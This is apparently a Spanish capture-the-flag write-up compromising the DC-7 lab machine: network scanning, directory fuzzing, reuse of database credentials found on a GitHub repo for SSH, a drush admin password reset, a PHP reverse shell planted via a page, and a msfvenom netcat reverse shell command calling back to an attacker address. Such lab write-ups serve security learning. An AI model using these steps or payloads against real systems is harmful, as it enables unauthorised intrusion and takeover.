Se realiza un ARP-SCAN para determinar la maquina victima.
```
$ sudo arp-scan 12.0.2.1/24
-> 12.0.2.7        08:00:27:de:86:25
```

Se realiza un escaneo nmap de los servicios y puertos de la maquina.
```
$ sudo nmap 12.0.2.7 -sS -Pn -sV -sC -O -vvv -oN nmap.txt -T5
-> 22, 80
```

**SSH**: OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
**HTTP**: Apache httpd 2.4.25 ((Debian))

### Primero revisamos la Web.
- Primero en la web analizamos las tecnologías que la forman.
	- **Drupal** : Un CMS, este posiblemente es la version 8
	- **PHP**: Lenguaje de programación back-end
	- **Apache HTTP Server**: Servidor donde se lanza el html (2.4.25)
	- **Debian**: OS
- Buscamos posibles vulnerabilidades en sus tecnológicas por su version.
	- **Apache 2.4.25**: Se encontro un crash server que puede detener el servicio mediante la vulnerabilidad CVE-2017-7659
	- **Drupal 8**: Se encontro una vulnerabilidad que puede ejecutar codigo aribitrario para las versiones de drupal 8.0 hasta 8.3.8 mediante la vulnerabilidad CVE-2018-7600


Hacemos Fuzzing en la Web para encontrar posibles sub directorios vulnerables
#### dirsearch
```
Target: http://12.0.2.7/

[12:18:54] Starting: 
[12:20:02] 200 -   95B  - /INSTALL.txt                                      
[12:20:03] 200 -   18KB - /LICENSE.txt                                           
[12:20:18] 200 -    6KB - /README.txt                                            
[12:20:21] 302 -  352B  - /Search  ->  http://12.0.2.7/search/node               
CTRL+C detected: Pausing threads, please wait...                                 
[q]uit / [c]ontinue: c                                                           
[12:25:53] 301 -  303B  - /core  ->  http://12.0.2.7/core/                       
[12:27:24] 301 -  328B  - /forum/install/install.php  ->  http://12.0.2.7/forum/install/core/install.php                                                          
[12:28:14] 200 -    9KB - /index.php                                             
[12:28:20] 301 -  314B  - /install.php  ->  http://12.0.2.7/core/install.php     
[12:29:43] 301 -  306B  - /modules  ->  http://12.0.2.7/modules/                 
[12:30:14] 200 -    8KB - /node                                                  
[12:31:51] 301 -  307B  - /profiles  ->  http://12.0.2.7/profiles/               
[12:32:10] 200 -    2KB - /robots.txt                                            
[12:32:20] 302 -  352B  - /search  ->  http://12.0.2.7/search/node               
[12:32:51] 301 -  304B  - /sites  ->  http://12.0.2.7/sites/                
[12:32:52] 200 -  515B  - /sites/README.txt                                 
[12:33:54] 301 -  305B  - /themes  ->  http://12.0.2.7/themes/              
[12:34:34] 302 -  348B  - /user  ->  http://12.0.2.7/user/login             
[12:34:36] 302 -  348B  - /user/  ->  http://12.0.2.7/user/login            
[12:34:37] 200 -   10KB - /user/login/                                      
[12:35:03] 200 -    4KB - /web.config                                       
[12:35:14] 301 -  323B  - /wp-admin/install.php  ->  http://12.0.2.7/wp-admin/core/install.php
                                                                            
Task Completed 
```

#### dirb
```
---- Scanning URL: http://12.0.2.7/ ----
+ http://12.0.2.7/admin (CODE:403|SIZE:8798)                                    
+ http://12.0.2.7/Admin (CODE:403|SIZE:8798)                                    
+ http://12.0.2.7/ADMIN (CODE:403|SIZE:8798)                                    
+ http://12.0.2.7/batch (CODE:403|SIZE:8798)                                    
==> DIRECTORY: http://12.0.2.7/core/                                            
+ http://12.0.2.7/index.php (CODE:200|SIZE:8731)                                
+ http://12.0.2.7/install.mysql (CODE:403|SIZE:296)                             
+ http://12.0.2.7/install.pgsql (CODE:403|SIZE:296)                             
==> DIRECTORY: http://12.0.2.7/modules/                                         
+ http://12.0.2.7/node (CODE:200|SIZE:8689)                                     
==> DIRECTORY: http://12.0.2.7/profiles/                                        
+ http://12.0.2.7/robots.txt (CODE:200|SIZE:1594)                               
+ http://12.0.2.7/Root (CODE:403|SIZE:287)                                      
+ http://12.0.2.7/search (CODE:302|SIZE:352)                                    
+ http://12.0.2.7/Search (CODE:302|SIZE:352)                                    
+ http://12.0.2.7/server-status (CODE:403|SIZE:296)                             
==> DIRECTORY: http://12.0.2.7/sites/                                           
==> DIRECTORY: http://12.0.2.7/themes/                                          
+ http://12.0.2.7/user (CODE:302|SIZE:348)                                      
+ http://12.0.2.7/vendor (CODE:403|SIZE:289)                                    
+ http://12.0.2.7/web.config (CODE:200|SIZE:4555)
```

```
---- Entering directory: http://12.0.2.7/core/ ----
==> DIRECTORY: http://12.0.2.7/core/assets/                                     
==> DIRECTORY: http://12.0.2.7/core/config/                                     
==> DIRECTORY: http://12.0.2.7/core/includes/                                   
+ http://12.0.2.7/core/install.mysql (CODE:403|SIZE:301)                        
+ http://12.0.2.7/core/install.pgsql (CODE:403|SIZE:301)                        
==> DIRECTORY: http://12.0.2.7/core/lib/                                        
==> DIRECTORY: http://12.0.2.7/core/misc/                                       
==> DIRECTORY: http://12.0.2.7/core/modules/                                    
==> DIRECTORY: http://12.0.2.7/core/profiles/                                   
+ http://12.0.2.7/core/Root (CODE:403|SIZE:292)                                 
==> DIRECTORY: http://12.0.2.7/core/scripts/                                    
==> DIRECTORY: http://12.0.2.7/core/tests/                                      
==> DIRECTORY: http://12.0.2.7/core/themes/
```

**Directorios de interés**
-> /robots.txt
-> /node/
-> /web.config 

**robots.txt**: no hay mucha información relevante sino mas urls filtradas en la pagina.
**node**: puede ser algo mas de interés mas adelante ya que tiene un fragmento rss.xss
**web.config**: muestra el como esta configurado el web server.

#### web.config
Algo interesante es la denegación de archivos que prohíbe el envió de ciertos archivos.
**Denegación de ciertos tipos de archivos.**
```
<rule name="Protect files and directories from prying eyes" stopProcessing="true">
   <match url="\.(engine|inc|install|module|profile|po|sh|.*sql|theme|twig|tpl(\.php)?|xtmpl|yml|svn-base)$|^(code-style\.pl|Entries.*|Repository|Root|Tag|Template|all-wcprops|entries|format|composer\.(json|lock))$"/>
   <action type="CustomResponse" statusCode="403" subStatusCode="0" statusReason="Forbidden" statusDescription="Access is forbidden."/>
</rule>

```

**1er intento de explotación**
1) Intento con exploit CVE-2018-7600, al parecer no es compatible :/

Analizando un poco mas la web me percate que existe un perfil en GitHub que relaciona la pagina vista.

![[Pasted image 20240111151614.png]]

Este perfil nos llevara a un GitHub que calza perfectamente con la pagina web, en ella encontré un file con credenciales.

**config.php**
```
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```

Trate de hacer un login con estas credenciales pero no hay éxito.
![[Pasted image 20240111152329.png]]

Luego trate de hacer una conexión **SSH** con estas credenciales y hubo éxito.
dentro podemos encontrar un folder con **backups** y una cadena de mensajes.

en los mensajes destacamos esto: 
`Subject: Cron <root@dc-7> /opt/scripts/backups.sh`

si hacemos **cat** a este script podemos ver que es un bash que ejecuta código sobre Drupal.
```
dc7user@dc-7:~$ cat /opt/scripts/backups.sh

#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz

```

**Explicación del script paso a paso**
1) **rm /home/dc7user/backups/* :** Elimina todos los archivos en el directorio /home/dc7user/backups/ antes de realizar la copia de seguridad para asegurarse de que no haya archivos antiguos en el directorio.
2) **cd /var/www/html/:** Cambia al directorio /var/www/html/. Este es el directorio donde se encuentra la instalación del sitio web que se va a respaldar.
3) **drush sql-dump --result-file=/home/dc7user/backups/website.sql**: Utiliza Drush (una interfaz de línea de comandos para Drupal) para realizar un volcado de la base de datos del sitio web y guarda el resultado en el archivo /home/dc7user/backups/website.sql.
4) **cd ..:** Cambia al directorio padre del directorio actual.
5) **tar -czf /home/dc7user/backups/website.tar.gz html/:** Crea un archivo comprimido (en formato tar y gzip) llamado website.tar.gz que contiene todos los archivos del directorio html/ (donde se encuentra la instalación del sitio web).
6) **gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql:** Utiliza GPG (GNU Privacy Guard) para cifrar el archivo website.sql con una contraseña proporcionada ("PickYourOwnPassword").
7) **gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz:** Utiliza GPG para cifrar el archivo website.tar.gz con la misma contraseña proporcionada.
8) **chown dc7user:dc7user /home/dc7user/backups/* :** Cambia el propietario y el grupo de todos los archivos en /home/dc7user/backups/ al usuario y grupo "dc7user".
9) r**m /home/dc7user/backups/website.sql:** Elimina el archivo original no cifrado website.sql después de que ha sido cifrado y se ha creado la copia cifrada.
10) **rm /home/dc7user/backups/website.tar.gz**: Elimina el archivo original no cifrado website.tar.gz después de que ha sido cifrado y se ha creado la copia cifrada.

#### Drush
averiguando un poco mas de **drush** encontré una guía básica, pero me llamo la atención que esta herramienta.
https://www.digitalocean.com/community/tutorials/a-beginner-s-guide-to-drush-the-drupal-shell

un simple comando para resetear la password de algún usuario.
```
drush user-password admin --password="new_pass"
```

success en cambiar la password
![[Pasted image 20240111220934.png]]

en la pagina debemos descargar un plugin para inyectar código malicioso y poder tomar acceso a la maquina.
![[Pasted image 20240111222715.png]]
Instalamos este package.
![[Pasted image 20240111223318.png]]
una vez instalado crearemos una nueva page para ejecutar el código php malicioso usando
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Obtenido.
![[Pasted image 20240113145708.png]]

spawneo un bash con python
```
python -c 'import pty; pty.spawn("/bin/bash")' 
```

Uso msfvenom para spawnear una reverse shell con ncat
```
msfvenom -p cmd/unix/reverse_netcat lhost=10.0.2.15 lport=3333 R
```
